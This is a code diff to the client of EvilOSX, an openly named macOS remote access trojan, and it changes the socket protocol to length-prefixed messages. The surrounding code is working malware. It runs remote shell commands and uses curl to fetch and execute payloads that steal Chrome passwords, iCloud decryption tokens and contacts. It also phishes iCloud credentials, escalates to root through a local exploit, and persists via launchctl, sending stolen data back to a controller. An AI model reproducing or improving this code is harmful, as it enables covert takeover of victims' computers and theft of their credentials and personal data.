@@ -11,6 +11,7 @@ import platform
 import base64
 import json
 import urllib2
+import struct
 
 MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
 MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"
@@ -31,7 +32,7 @@ def icloud_phish(server_socket, email):
         try:
             server_socket.settimeout(0.0)  # Timeout recv immediately if no response
 
-            if server_socket.recv(4096) == "icloud_phish_stop":
+            if receive_message(server_socket) == "icloud_phish_stop":
                 server_socket.settimeout(None)
 
                 if not response:
@@ -76,7 +77,7 @@ def icloud_phish(server_socket, email):
 
 def get_root(server_socket):
     if is_root():
-        server_socket.sendall(MESSAGE_ATTENTION + "We are already root!")
+        send_response(server_socket, MESSAGE_ATTENTION + "We are already root!")
     else:
         system_version = str(platform.mac_ver()[0])
 
@@ -89,7 +90,7 @@ def get_root(server_socket):
 
             if "Exploit completed." in execute_command("python {0}".format(payload_file), False):
                 # We can now run commands as sudo, move EvilOSX to a root location.
-                server_socket.sendall(MESSAGE_INFO + "Exploit completed successfully, reconnecting as root.")
+                send_response(server_socket, MESSAGE_INFO + "Exploit completed successfully, reconnecting as root.")
 
                 execute_command("rm -rf {0}".format(payload_file))
                 execute_command("sudo mkdir -p {0}".format(get_program_folder(True)))
@@ -106,9 +107,9 @@ def get_root(server_socket):
                 execute_command("sudo launchctl load -w {0}".format(get_launch_agent_file(True)))
                 kill_client()
             else:
-                server_socket.sendall(MESSAGE_ATTENTION + "Unknown error while running exploit.")
+                send_response(server_socket, MESSAGE_ATTENTION + "Unknown error while running exploit.")
         else:
-            server_socket.sendall(MESSAGE_ATTENTION + "LPE not implemented for this version of OS X ({0}).\n".format(system_version))
+            send_response(server_socket, MESSAGE_ATTENTION + "LPE not implemented for this version of OS X ({0}).\n".format(system_version))
 
 
 def kill_client(root=False):
@@ -179,6 +180,36 @@ def get_model():
     model = execute_command("/usr/libexec/PlistBuddy -c 'Print :\"{0}\"' /System/Library/PrivateFrameworks/ServerInformation.framework/Versions/A/Resources/English.lproj/SIMachineAttributes.plist | grep marketingModel".format(model_key))
 
     return model.split("= ")[1]
+
+
+def send_response(server_socket, message):
+    # Prefix each message with a 4-byte length (network byte order)
+    prefixed_message = struct.pack('>I', len(message)) + message
+    server_socket.sendall(prefixed_message)
+
+
+def receive_message(server_socket):
+    # Read message length and unpack it into an integer
+    message_length = receive_all(server_socket, 4)
+
+    if not message_length:
+        return None
+
+    msglen = struct.unpack('>I', message_length)[0]
+
+    # Read the message data
+    return receive_all(server_socket, msglen)
+
+
+def receive_all(server_socket, message_length):
+    """Helper function to receive message_length bytes or return None if EOF is hit."""
+    data = ''
+    while len(data) < message_length:
+        packet = server_socket.recv(message_length - len(data))
+        if not packet:
+            return None
+        data += packet
+    return data
 
 
 def execute_command(command, cleanup=True):
@@ -278,7 +309,7 @@ def start_server():
             continue
 
         while True:
-            command = server_socket.recv(4096)
+            command = receive_message(server_socket)
 
             if not command:
                 print MESSAGE_ATTENTION + "Server disconnected."
@@ -287,11 +318,11 @@ def start_server():
             print MESSAGE_INFO + "Received command: " + command
 
             if command == "get_computer_name":
-                server_socket.sendall(get_computer_name())
+                send_response(server_socket, get_computer_name())
             elif command == "get_shell_info":
                 shell_info = execute_command("whoami") + "\n" + get_computer_name() + "\n" + execute_command("pwd")
 
-                server_socket.sendall(shell_info)
+                send_response(server_socket, shell_info)
             elif command == "get_info":
                 system_version = str(platform.mac_ver()[0])
                 battery = execute_command("pmset -g batt").split('\t')[1].split(";")
@@ -311,7 +342,7 @@ def start_server():
                 else:
                     response += MESSAGE_INFO + "FileVault is off.\n"
 
-                server_socket.sendall(response)
+                send_response(server_socket, response)
             elif command == "chrome_passwords":
                 payload_url = "https://raw.githubusercontent.com/Marten4n6/EvilOSX/master/Payloads/chrome_passwords.py"
                 payload_file = "/tmp/chrome_passwords.py"
@@ -321,13 +352,13 @@ def start_server():
 
                 if "Error" in output:
                     if "clicked deny" in output:
-                        server_socket.sendall(MESSAGE_ATTENTION + "Failed to get chrome passwords, user clicked deny.")
+                        send_response(server_socket, MESSAGE_ATTENTION + "Failed to get chrome passwords, user clicked deny.")
                     elif "entry not found":
-                        server_socket.sendall(MESSAGE_ATTENTION + "Failed to get chrome passwords, Chrome not found.")
+                        send_response(server_socket, MESSAGE_ATTENTION + "Failed to get chrome passwords, Chrome not found.")
                     else:
-                        server_socket.sendall(MESSAGE_ATTENTION + "Failed to get chrome passwords, unknown error.")
+                        send_response(server_socket, MESSAGE_ATTENTION + "Failed to get chrome passwords, unknown error.")
                 else:
-                    server_socket.sendall(output)
+                    send_response(server_socket, output)
 
                 execute_command("rm -rf {0}".format(payload_file))
             elif command == "decrypt_mme":
@@ -338,21 +369,21 @@ def start_server():
                 output = execute_command("python {0}".format(payload_file), False)
 
                 if "Failed to get iCloud" in output:
-                    server_socket.sendall(MESSAGE_ATTENTION + "Failed to get iCloud Decryption Key (user clicked deny).")
+                    send_response(server_socket, MESSAGE_ATTENTION + "Failed to get iCloud Decryption Key (user clicked deny).")
                 elif "Failed to find" in output:
-                    server_socket.sendall(MESSAGE_ATTENTION + "Failed to find MMeToken file.")
+                    send_response(server_socket, MESSAGE_ATTENTION + "Failed to find MMeToken file.")
                 else:
                     # Decrypted successfully, store tokens in tokens.json
                     with open(get_program_folder(is_root()) + "/tokens.json", "w") as open_file:
                         open_file.write(output)
 
-                    server_socket.sendall(MESSAGE_INFO + "Decrypted successfully.")
+                    send_response(server_socket, MESSAGE_INFO + "Decrypted successfully.")
 
                 execute_command("rm -rf {0}".format(payload_file))
             elif command == "icloud_contacts":
                 if not os.path.isfile(get_program_folder(is_root()) + "/tokens.json"):
                     # The server should handle this message and then call "decrypt_mme".
-                    server_socket.sendall(MESSAGE_ATTENTION + "Failed to find tokens.json")
+                    send_response(server_socket, MESSAGE_ATTENTION + "Failed to find tokens.json")
                 else:
                     payload_url = "https://raw.githubusercontent.com/Marten4n6/EvilOSX/master/Payloads/icloud_contacts.py"
                     payload_file = "/tmp/icloud_contacts.py"
@@ -371,14 +402,14 @@ def start_server():
                             response += MESSAGE_INFO + "Contacts for \"{0}\":\n".format(key)
                             response += output
 
-                        server_socket.sendall(response)
+                        send_response(server_socket, response)
 
                     execute_command("rm -rf {0}".format(payload_file))
             elif command.startswith("icloud_phish"):
                 email = command.replace("icloud_phish ", "")
                 output = icloud_phish(server_socket, email)
 
-                server_socket.sendall(output)
+                send_response(server_socket, output)
             elif command.startswith("find_my_iphone"):
                 email = command.split(" ")[1]
                 password = command.split(" ")[2]
@@ -389,10 +420,10 @@ def start_server():
                 execute_command("curl {0} -s -o {1}".format(payload_url, payload_file))
                 output = execute_command("python {0} {1} {2}".format(payload_file, email, password), False)
 
-                server_socket.sendall(output)
+                send_response(server_socket, output)
                 execute_command("rm -rf {0}".format(payload_file))
             elif command == "kill_client":
-                server_socket.sendall("Farewell.")
+                send_response(server_socket, "Farewell.")
                 kill_client(is_root())
             elif command == "get_root":
                 get_root(server_socket)
@@ -401,9 +432,9 @@ def start_server():
                 if len(command) > 3 and command[0:3] == "cd ":
                     try:
                         os.chdir(command[3:])
-                        server_socket.sendall(base64.b64encode("EMPTY"))
+                        send_response(server_socket, base64.b64encode("EMPTY"))
                     except OSError:
-                        server_socket.sendall(base64.b64encode("EMPTY"))
+                        send_response(server_socket, base64.b64encode("EMPTY"))
                         pass
                 else:
                     process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
@@ -415,9 +446,9 @@ def start_server():
                         response = stdout + stderr
 
                         if not response:
-                            server_socket.sendall(base64.b64encode("EMPTY"))
+                            send_response(server_socket, base64.b64encode("EMPTY"))
                         else:
-                            server_socket.sendall(base64.b64encode(response))
+                            send_response(server_socket, base64.b64encode(response))
                     finally:
                         timer.cancel()
 
